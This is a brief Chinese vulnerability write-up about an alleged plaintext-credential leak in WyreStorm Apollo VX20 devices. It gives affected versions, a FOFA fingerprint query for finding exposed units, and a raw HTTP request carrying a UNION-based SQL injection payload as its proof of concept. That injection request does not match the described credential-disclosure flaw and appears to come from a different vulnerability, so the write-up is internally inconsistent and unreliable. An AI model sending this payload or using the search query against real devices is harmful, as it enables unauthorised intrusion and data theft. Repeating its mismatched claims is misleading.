<a name="e6Em4"></a>
# 一、漏洞描述
```java
WyreStorm Apollo VX20是一款优质的音视频会议一体机，专为企业办公室和会议室空间设计。这款设备集成了摄像头、麦克风、扬声器及投屏功能，为企业办公和视频会议提供优质的视听体验。该系统存在信息泄露漏洞，未经授权的远程攻击者可以获取明文凭据。
```
<a name="YarwI"></a>
# 二、漏洞影响
```java
WyreStorm Apollo VX20 < 1.3.58
```
<a name="YpI0q"></a>
# 三、fofa搜索语法
```java
icon_hash="-893957814"
```
<a name="TNcUl"></a>
# 四、漏洞复现
```java
POST /building/json_common.php HTTP/1.1
Host: 192.168.86.128:8097
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Content-Length: 87
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/42988647/1719271628550-8bed0fd8-746f-4d4b-8c9d-c37a8ed66e8c.png#clientId=ud521e60a-9dae-4&from=paste&height=121&id=u4b2f127f&originHeight=151&originWidth=1027&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3797&status=done&style=none&taskId=ub8b80d47-32c7-4a17-94e4-8cc87d1e6fd&title=&width=821.6)


